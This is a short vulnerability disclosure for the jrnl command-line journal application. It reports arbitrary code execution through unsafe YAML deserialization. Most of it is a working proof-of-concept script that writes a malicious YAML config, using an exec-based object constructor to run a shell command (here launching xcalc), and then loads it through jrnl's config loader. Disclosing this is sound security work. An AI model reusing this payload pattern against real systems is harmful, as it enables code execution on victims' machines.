# Description  

`jrnl` is a simple journal application for the command line., which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install jrnl
```

### Run exploit.py
```
import os
#os.sysem('pip3 install jrnl')
from jrnl import config
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
config.load_config('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
